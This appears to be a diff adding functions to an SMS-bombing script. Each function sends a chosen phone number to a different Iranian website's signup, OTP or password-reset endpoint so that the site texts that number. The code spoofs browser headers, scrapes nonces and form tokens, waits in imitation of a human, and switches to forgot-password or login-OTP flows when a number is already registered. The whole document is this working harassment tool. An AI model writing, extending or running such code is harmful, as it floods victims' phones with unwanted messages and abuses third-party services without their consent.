@@ -1417,6 +1417,455 @@ def ickala(phone):
 
 
 
+def tecsho(mobile, email="email@yahoo.com", u="9876543210"):
+    url, headers = "https://tecsho.com/Home/SendMessage", {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "X-Requested-With": "XMLHttpRequest",
+        "Cache-Control": "private",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+    }
+    try:
+        r = requests.get(url, params={"u": u, "email": email, "mobile": format_mobile(mobile)}, headers=headers, timeout=10)
+        data = r.json() if r.headers.get('Content-Type', '').startswith('application/json') else r.text
+        print(f"[STATUS] {r.status_code}\n[RESPONSE] {data}")
+        return data
+    except Exception as e:
+        print(f"[ERROR] {e}")
+        return None
+
+
+
+
+
+def buybest(mobile, first_name="کاربر", last_name="عادی", password="Password123@"):
+    d = ''.join(filter(str.isdigit, str(mobile)))
+    formatted_mobile = f"0{d[-10:]}"
+    
+    url = "https://buybestelectronic.com/ajax/Authentication/subscribe"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+    }
+    
+    payload = {
+        "mobile": formatted_mobile, "email": "", "password": password, "confirm_password": password,
+        "first_name": first_name, "last_name": last_name, "marketer": "", "referral": "",
+        "introduction_method_id": "1", "activity_field": "ابزار دقیق", "customer_type": "natural_person", "__ajax": "1"
+    }
+    
+    try:
+        r = requests.post(url, data=payload, headers=headers, timeout=10)
+        data = r.json()
+        
+        if data.get("status") is False and "قبلا ثبت نام شده" in str(data.get("message")):
+            print("[INFO] User exists, switching to ForgotPassword...")
+            r_forgot = requests.post("https://buybestelectronic.com/ajax/Authentication/ajaxForgotPassword", 
+                                     data={"mobile": formatted_mobile, "__ajax": "1"}, 
+                                     headers=headers, timeout=10)
+            data = r_forgot.json()
+            
+        print(f"[STATUS] {r.status_code}\n[RESPONSE] {data}")
+        return data
+    except Exception as e:
+        print(f"[ERROR] {e}")
+        return None
+
+
+
+
+
+
+def daneshjookit(mobile, first_name="نام", last_name="خانوادگی", password="Password123@"):
+    d = ''.join(filter(str.isdigit, str(mobile)))
+    mobile_f = f"0{d[-10:]}"
+    
+    url = "https://daneshjookit.com/login"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+    }
+    
+    s = requests.Session()
+    s.headers.update(headers)
+    s.get(url, timeout=10)
+    
+    payload = {
+        "username": mobile_f, "id_customer": "", "back": "my-account", "firstname": first_name,
+        "lastname": last_name, "email": "", "password": password, "action": "register", "ajax": "1"
+    }
+    
+    try:
+        r = s.post(url, data=payload, timeout=10)
+        data = r.json()
+        
+        if data.get("result") is False and "قبلا استفاده شده" in str(data.get("errors", "")):
+            print("[INFO] User exists, switching to login-otp...")
+            r = s.post(f"{url}?back=my-account", 
+                       data={"action": "login", "type": "login-otp", "username": mobile_f, "ajax": "1"}, 
+                       timeout=10)
+            data = r.json()
+            
+        print(f"[STATUS] {r.status_code}\n[RESPONSE] {data}")
+        return data
+    except Exception as e:
+        print(f"[ERROR] {e}")
+        return None
+
+
+
+
+
+def arvand(phone):
+    d = ''.join(filter(str.isdigit, str(phone)))
+    mobile = f"98{d[-10:]}"
+    url = "https://arvandguarantee.shop/customer/customer/authCustomer"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+    try:
+        r = requests.post(url, data={"phoneNumber": mobile, "countryCode": "98", "method": "sms"}, headers=headers, timeout=10)
+        print(f"[STATUS] {r.status_code}\n[RESPONSE] {r.text}")
+        return r.status_code, r.text
+    except Exception as e:
+        print(f"[ERROR] {e}")
+        return None, None
+
+
+
+
+
+
+def catering(mobile):
+    d = ''.join(filter(str.isdigit, str(mobile)))
+    mobile_f = f"0{d[-10:]}"
+    url = "https://cateringclassic.com/api/v1/sessions/login_request"
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+    }
+    try:
+        r = requests.post(url, json={"mobile_phone": mobile_f}, headers=headers, timeout=10)
+        data = r.json()
+        print(f"[STATUS] {r.status_code}\n[RESPONSE] {data}")
+        return data
+    except Exception as e:
+        print(f"[ERROR] {e}")
+        return None
+
+
+
+
+
+def qazvinfood(mobile):
+    d = ''.join(filter(str.isdigit, str(mobile)))
+    mobile_f = f"0{d[-10:]}"
+    url = "https://api-prod.qazvinfood.com/site/v1/auth/get-otp"
+    headers = {
+        "Content-Type": "application/json",
+        "X-App-Source": "web",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+    }
+    try:
+        r = requests.post(url, json={"username": mobile_f}, headers=headers, timeout=10)
+        data = r.json()
+        print(f"[STATUS] {r.status_code}\n[RESPONSE] {data}")
+        return data
+    except Exception as e:
+        print(f"[ERROR] {e}")
+        return None
+
+
+
+
+
+def andre(mobile):
+    d = ''.join(filter(str.isdigit, str(mobile)))
+    s = requests.Session()
+    s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"})
+    
+    try:
+        resp = s.get("https://andre.shop/product/loghmeh-kebab-70-450g/")
+        f_id = re.search(r'digits_form["\']?\s*[:=]\s*["\']?([a-f0-9]+)', resp.text)
+        
+        payload = {
+            "digt_countrycode": "+98", "phone": d[-10:], "digits_process_register": "1",
+            "sms_otp": "", "digits_otp_field": "1", "instance_id": "f6b40649cb03a2aceb0c27ea629dd571",
+            "optional_data": "optional_data", "action": "digits_forms_ajax", "type": "register",
+            "dig_otp": "otp", "digits": "1", "digits_redirect_page": "//andre.shop/",
+            "digits_form": f_id.group(1) if f_id else "656bafe1a2",
+            "sub_action": "sms_otp"
+        }
+        
+        r = s.post("https://andre.shop/wp-admin/admin-ajax.php", data=payload, timeout=10)
+        print(f"[STATUS] {r.status_code}\n[RESPONSE] {r.json()}")
+        return r.json()
+    except Exception as e:
+        print(f"[ERROR] {e}")
+
+
+
+
+
+
+def dadlisan(phone):
+    url = "https://dadlisan.com/api/customer/member/register/"
+    payload = {
+        "email": phone,
+        "accept_term": "on"
+    }
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+    }
+    try:
+        r = requests.post(url, data=payload, headers=headers, timeout=10)
+        data = r.json()
+        print(f"[STATUS] {r.status_code}\n[RESPONSE] {data}")
+        return data
+    except Exception as e:
+        print(f"[ERROR] {e}")
+        return None
+
+
+
+
+
+def ravanamooz(mobile):
+    url_base = "https://ravanamooz.ir/"
+    url_ajax = "https://ravanamooz.ir/wp-admin/admin-ajax.php"
+    
+    session = requests.Session()
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest"
+    })
+    
+    print("[+] در حال دریافت نانس...")
+    response = session.get(url_base)
+    
+    match = re.search(r'nonce["\']?\s*:\s*["\']([a-zA-Z0-9]+)["\']', response.text)
+    
+    if not match:
+        print("[-] نانس پیدا نشد!")
+        return
+    
+    nonce = match.group(1)
+    print(f"[+] نانس پیدا شد: {nonce}")
+    
+    print(f"[+] در حال ارسال پیامک به {mobile}...")
+    payload = {
+        "action": "fast_auth_send_otp",
+        "nonce": nonce,
+        "phone": mobile
+    }
+    
+    r = session.post(url_ajax, data=payload)
+    
+    if r.status_code == 200:
+        print("[+] درخواست با موفقیت ارسال شد.")
+        print(f"Server Response: {r.text}")
+    else:
+        print(f"[-] خطا در ارسال: {r.status_code}")
+
+
+
+
+
+def arjmand(mobile):
+    # این URL دقیقاً همان آدرسی است که در مرورگر باز می‌شود
+    url = f"https://www.arjmandpub.com/RegisterConfirmation?input={mobile}&returnUrl=%2F"
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
+    }
+    
+    try:
+        # در این سایت، درخواست به صورت GET ارسال می‌شود
+        response = requests.get(url, headers=headers)
+        
+        if response.status_code == 200:
+            print("[+] درخواست با موفقیت به سرور ارجمند ارسال شد.")
+            # چون پاسخ HTML است، باید بخشی از صفحه را جستجو کنیم تا ببینیم موفق بوده یا نه
+            if "کد تایید" in response.text or "ارسال شد" in response.text:
+                print("[+] پیامک احتمالا ارسال شده است.")
+            else:
+                print("[!] صفحه پاسخ دریافت شد، اما پیامی مبنی بر ارسال کد یافت نشد.")
+        else:
+            print(f"[-] خطای سرور: {response.status_code}")
+            
+    except Exception as e:
+        print(f"[-] خطا در اتصال: {e}")
+
+
+
+
+
+
+def ravandarman(mobile):
+    d = ''.join(filter(str.isdigit, str(mobile)))
+    url = "https://papi.ravandarman.com/register/fast"
+    headers = {
+        "Content-Type": "application/json;charset=utf-8",
+        "RUN-MODE": "DEBUG",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+    }
+    payload = {
+        "firstName": "کاربر", "lastName": "گرامی", "gender": 0,
+        "registerField": "tel", "termsAndConditions": True, "tel": d
+    }
+    try:
+        r = requests.post(url, json=payload, headers=headers, timeout=10)
+        print(f"[STATUS] {r.status_code}\n[RESPONSE] {r.text}")
+        return r.json()
+    except Exception as e:
+        print(f"[ERROR] {e}")
+
+
+
+
+
+
+def snapp_dr(mobile):
+    url = f"https://api.snapp.doctor/userauth/otp?mobile={mobile}"
+    
+    # استفاده از یک Session برای حفظ کوکی‌ها
+    session = requests.Session()
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.5 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "fa-IR,fa;q=0.9",
+        "Connection": "keep-alive",
+        "Referer": "https://snapp.doctor/", # اضافه کردن رفرر بسیار حیاتی است
+        "Origin": "https://snapp.doctor"
+    }
+    
+    # شبیه‌سازی ورود به صفحه اصلی برای دریافت کوکی‌های امنیتی
+    try:
+        session.get("https://snapp.doctor/", headers=headers)
+        time.sleep(2.5) # تأخیر انسانی
+        
+        # ارسال درخواست OTP
+        response = session.get(url, headers=headers)
+        
+        print(f"[STATUS] {response.status_code}")
+        print(f"[RESPONSE] {response.text}")
+        
+    except Exception as e:
+        print(f"[-] خطای اتصال: {e}")
+
+
+
+
+
+
+
+def drsaina(mobile):
+    m = format_mobile(mobile)
+    url = "https://www.drsaina.com/api/v2/authentication/request-totp"
+    headers = {
+        "Content-Type": "application/json; charset=utf-8",
+        "api-supported-versions": "2.0",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Referer": "https://www.drsaina.com/"
+    }
+    
+    try:
+        r = requests.post(url, json={"phoneNumber": m}, headers=headers, timeout=10)
+        print(f"[STATUS] {r.status_code}\n[RESPONSE] {r.text}")
+        return r.json()
+    except Exception as e:
+        print(f"[ERROR] {e}")
+
+
+
+
+
+
+def shiva(mobile):
+    m = format_mobile(mobile)
+    url_base = "https://shivapsy.ir/"
+    url_ajax = "https://shivapsy.ir/wp-admin/admin-ajax.php"
+    
+    s = requests.Session()
+    s.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest"
+    })
+
+    try:
+        resp = s.get(url_base, timeout=10)
+        n_match = re.search(r'nonce["\']?\s*[:=]\s*["\']?([a-f0-9]+)', resp.text)
+        
+        if not n_match:
+            print("[-] Nonce not found!")
+            return
+
+        payload = {
+            "action": "shik_send_otp",
+            "phone": m,
+            "nonce": n_match.group(1)
+        }
+        
+        r = s.post(url_ajax, data=payload, timeout=10)
+        print(f"[STATUS] {r.status_code}\n[RESPONSE] {r.text}")
+        return r.json()
+    except Exception as e:
+        print(f"[ERROR] {e}")
+
+
+
+
+
+def nobat(mobile):
+    m = format_mobile(mobile)
+    url = "https://api.nobat.ir/patient/login/phone"
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+    }
+    try:
+        r = requests.post(url, json={"mobile": m}, headers=headers, timeout=10)
+        print(f"[STATUS] {r.status_code}\n[RESPONSE] {r.text}")
+        return r.json()
+    except Exception as e:
+        print(f"[ERROR] {e}")
+
+
+
+
+
+def get_new_token():
+    # Placeholder for credentials
+    payload = {"phone": "YOUR_LOGIN_PHONE", "password": "YOUR_PASSWORD"}
+    res = requests.post("https://api.f4k.ir/v1/customer/login", json=payload)
+    if res.status_code == 200:
+        token = res.json().get('token')
+        with open("token.json", 'w') as f: json.dump({"token": token}, f)
+        return token
+    return None
+
+def f4k(m):
+    m = format_mobile(m)
+    if os.path.exists("token.json"):
+        with open("token.json", 'r') as f: token = json.load(f).get('token')
+    else: token = get_new_token()
+
+    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
+    res = requests.post("https://api.f4k.ir/v1/customer/otp", json={"phone": m}, headers=headers)
+
+    if res.status_code == 401:
+        token = get_new_token()
+        headers["Authorization"] = f"Bearer {token}"
+        res = requests.post("https://api.f4k.ir/v1/customer/otp", json={"phone": m}, headers=headers)
+    
+    print(f"[STATUS] {res.status_code}\n[RESPONSE] {res.text}")
 
 
 # ==========================
